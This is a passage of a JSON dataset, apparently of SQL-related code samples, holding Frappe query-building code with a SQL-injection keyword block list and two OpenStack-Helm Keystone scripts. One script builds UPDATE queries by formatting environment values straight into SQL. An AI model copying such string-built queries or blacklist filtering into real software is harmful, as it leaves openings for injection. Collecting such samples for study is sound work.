version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)\n\n\t\tdef _is_query(field):\n\t\t\tif re.compile(\"^(select|delete|update|drop|create)\\s\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\telif re.compile(\"\\s*[a-zA-z]*\\s*( from | group by | order by | where | join )\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\t_is_query(field)\n\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\tkwargs.pop('ignore_permissions', None)\n\n\t# If doctype is child table\n\tif frappe.is_table(doctype):\n\t\t# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})\n\t\t# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item\n\n\t\tif not kwargs.get('parent'):\n\t\t\tfrappe.flags.error_message = _('Parent is required to get child table data')\n\t\t\traise frappe.PermissionError(doctype)\n\n\t\tcheck_parent_permission(kwargs.get('parent'), doctype)\n\t\tdel kwargs['parent']\n\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zhen00fa/openstack-helm/blob/cc4c9cdc9dca454430456493fcb0cefc1e8ecab9",
        "file_path": "/keystone/templates/bin/_endpoint-update.py.tpl",
        "source": "{{/*\nCopyright 2017 The Openstack-Helm Authors.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n*/}}\n\n#!/usr/bin/env python\nimport os\nimport sys\nimport ConfigParser\nimport logging\nfrom sqlalchemy import create_engine\n\n# Create logger, console handler and formatter\nlogger = logging.getLogger('OpenStack-Helm Keystone Endpoint management')\nlogger.setLevel(logging.DEBUG)\nch = logging.StreamHandler()\nch.setLevel(logging.DEBUG)\nformatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n\n# Set the formatter and add the handler\nch.setFormatter(formatter)\nlogger.addHandler(ch)\n\n# Get the connection string for the service db\nif \"OPENSTACK_CONFIG_FILE\" in os.environ:\n    os_conf = os.environ['OPENSTACK_CONFIG_FILE']\n    if \"OPENSTACK_CONFIG_DB_SECTION\" in os.environ:\n        os_conf_section = os.environ['OPENSTACK_CONFIG_DB_SECTION']\n    else:\n        logger.critical('environment variable OPENSTACK_CONFIG_DB_SECTION not set')\n        sys.exit(1)\n    if \"OPENSTACK_CONFIG_DB_KEY\" in os.environ:\n        os_conf_key = os.environ['OPENSTACK_CONFIG_DB_KEY']\n    else:\n        logger.critical('environment variable OPENSTACK_CONFIG_DB_KEY not set')\n        sys.exit(1)\n    try:\n        config = ConfigParser.RawConfigParser()\n        logger.info(\"Using {0} as db config source\".format(os_conf))\n        config.read(os_conf)\n        logger.info(\"Trying to load db config from {0}:{1}\".format(\n            os_conf_section, os_conf_key))\n        user_db_conn = config.get(os_conf_section, os_conf_key)\n        logger.info(\"Got config from {0}\".format(os_conf))\n    except:\n        logger.critical(\"Tried to load config from {0} but failed.\".format(os_conf))\n        raise\nelif \"DB_CONNECTION\" in os.environ:\n    user_db_conn = os.environ['DB_CONNECTION']\n    logger.info('Got config from DB_CONNECTION env var')\nelse:\n    logger.critical('Could not get db config, either from config file or env var')\n    sys.exit(1)\n\n# User DB engine\ntry:\n    user_engine = create_engine(user_db_conn)\nexcept:\n    logger.critical('Could not get user database config')\n    raise\n\n# Set Internal Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_INTERNAL_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update internal endpoint\")\n    raise\n\n# Set Admin Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_ADMIN_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update admin endpoint\")\n    raise\n\n# Set Public Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_PUBLIC_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update public endpoint\")\n    raise\n\n# Print endpoints\ntry:\n    endpoints = user_engine.execute(\n        \"select interface, url from endpoint where service_id = (select id from service where service.type = 'identity')\"\n    ).fetchall()\n    for row in endpoints:\n        logger.info(\"endpoint ({0}): {1}\".format(row[0], row[1]))\nexcept:\n    logger.critical(\"Could not update endpoint\")\n    raise\n\nlogger.info('Finished Endpoint Management')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zhen00fa/openstack-helm/blob/cc4c9cdc9dca454430456493fcb0cefc1e8ecab9",
        "file_path": "/keystone/templates/bin/_fernet-manage.py.tpl",
        "source": "#!/usr/bin/env python\n\n{{/*\nCopyright 2017 The Openstack-Helm Authors.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n*/}}\n\nimport argparse\nimport base64\nimport errno\nimport grp\nimport logging\nimport os\nimport pwd\nimport re\nimport six\nimport subprocess\nimport sys\nimport time\n\nimport requests\n\nFERNET_DIR = os.environ['KEYSTONE_KEYS_REPOSITORY']\nKEYSTONE_USER = os.environ['KEYSTONE_USER']\nKEYSTONE_GROUP = os.environ['KEYSTONE_GROUP']\nNAMESPACE = os.environ['KUBERNETES_NAMESPACE']\n\n# k8s connection data\nKUBE_HOST = None\nKUBE_CERT = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'\nKUBE_TOKEN = None\n\nLOG_DATEFMT = \"%Y-%m-%d %H:%M:%S\"\nLOG_FORMAT = \"%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s\"\nlogging.basicConfig(format=LOG_FORMAT, datefmt=LOG_DATEFMT)\nLOG = logging.getLogger(__name__)\nLOG.setLevel(logging.INFO)\n\n\ndef read_kube_config():\n    global KUBE_HOST, KUBE_TOKEN\n    KUBE_HOST = \"https://%s:%s\" % ('kubernetes.default',\n                                   os.environ['KUBERNETES_SERVICE_PORT'])\n    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:\n        KUBE_TOKEN = f.read()\n\n\ndef get_secret_definition(name):\n    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)\n    resp = requests.get(url,\n                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},\n                        verify=KUBE_CERT)\n    if resp.status_code != 200:\n        LOG.error('Cannot get secret %s.', name)\n        LOG.error(resp.text)\n        return None\n    return resp.json()\n\n\ndef update_secret(name, secret):\n    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)\n    resp = requests.put(url,\n                        json=secret,\n                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},\n                        verify=KUBE_CERT)\n    if resp.status_code != 200:\n        LOG.error('Cannot update secret %s.', name)\n        LOG.error(resp.text)\n        return False\n    return True\n\n\ndef read_from_files():\n    keys = filter(\n        lambda name: os.path.isfile(FERNET_DIR + name) and re.match(\"^\\d+$\",\n                                                                    name),\n        os.listdir(FERNET_DIR)\n    )\n    data = {}\n    for key in keys:\n        with open(FERNET_DIR + key, 'r') as f:\n            data[key] = f.read()\n    if len(keys):\n        LOG.debug(\"Keys read from files: %s\", keys)\n    else:\n        LOG.warn(\"No keys were read from files.\")\n    return data\n\n\ndef get_keys_data():\n    keys = read_from_files()\n    return dict([(key, base64.b64encode(value.encode()).decode())\n                for (key, value) in six.iteritems(keys)])\n\n\ndef write_to_files(data):\n    if not os.path.exists(os.path.dirname(FERNET_DIR)):\n        try:\n            os.makedirs(os.path.dirname(FERNET_DIR))\n        except OSError as exc: # Guard against race condition\n            if exc.errno != errno.EEXIST:\n                raise\n        uid = pwd.getpwnam(KEYSTONE_USER).pw_uid\n        gid = grp.getgrnam(KEYSTONE_GROUP).gr_gid\n        os.chown(FERNET_DIR, uid, gid)\n\n    for (key, value) in six.iteritems(data):\n        with open(FERNET_DIR + key, 'w') as f:\n            decoded_value = base64.b64decode(value).decode()\n            f.write(decoded_value)\n            LOG.debug(\"Key %s: %s\", key, decoded_value)\n    LOG.info(\"%s keys were written\", len(data))\n\n\ndef execute_command(cmd):\n    LOG.info(\"Executing 'keystone-manage %s --keystone-user=%s \"\n             \"--keystone-group=%s' command.\",\n             cmd, KEYSTONE_USER, KEYSTONE_GROUP)\n    subprocess.call(['keystone-manage', cmd,\n                     '--keystone-user=%s' % KEYSTONE_USER,\n                     '--keystone-group=%s' % KEYSTONE_GROUP])\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('command', choices=['fernet_setup', 'fernet_rotate',\n                                            'credential_setup',\n                                            'credential_rotate'])\n    args = parser.parse_args()\n\n    is_credential = args.command.startswith('credential')\n\n    SECRET_NAME = ('keystone-credential-keys' if is_credential else\n                   'keystone-fernet-keys')\n\n    read_kube_config()\n    secret = get_secret_definition(SECRET_NAME)\n    if not secret:\n        LOG.error(\"Secret '%s' does not exist.\", SECRET_NAME)\n        sys.exit(1)\n\n    if args.command in ('fernet_rotate', 'credential_rotate'):\n        LOG.info(\"Copying existing %s keys from secret '%s' to %s.\",\n                 'credential' if is_credential else 'fernet', SECRET_NAME,\n                 FERNET_DIR)\n        write_to_files(secret['data'])\n\n    execute_command(args.command)\n\n    LOG.info(\"Updating data for '%s' secret.\", SECRET_NAME)\n    updated_keys = get_keys_data()\n    secret['data'] = updated_keys\n    if not update_secret(SECRET_NAME, secret):\n        sys.exit(1)\n    LOG.info(\"%s fernet keys have been placed to secret '%s'\",\n             len(updated_keys), SECRET_NAME)\n    LOG.debug(\"Placed keys: %s\", updated_keys)\n    LOG.info(\"%s keys %s has been completed\",\n             \"Credential\" if is_credential else 'Fernet',\n             \"rotation\" if args.command.endswith('_rotate') else \"generation\")\n\n    if args.command == 'credential_rotate':\n        # `credential_rotate` needs doing `credential_migrate` as well once all\n        # of the nodes have the new keys. So we'll sleep configurable amount of\n        # time to make sure k8s reloads the secrets in all pods and then\n        # execute `credential_migrate`.\n\n        migrate_wait = int(os.getenv('KEYSTONE_CREDENTIAL_MIGRATE_WAIT', \"60\"))\n        LOG.info(\"Waiting %d seconds to execute `credential_migrate`.\",\n                 migrate_wait)\n        time.sleep(migrate_wait)\n\n        execute_command('credential_migrate')\n\nif __name__ == \"__main__\":\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/op317q/openstack-helm/blob/cc4c9cdc9dca454430456493fcb0cefc1e8ecab9",
        "file_path": "/keystone/templates/bin/_endpoint-update.py.tpl",
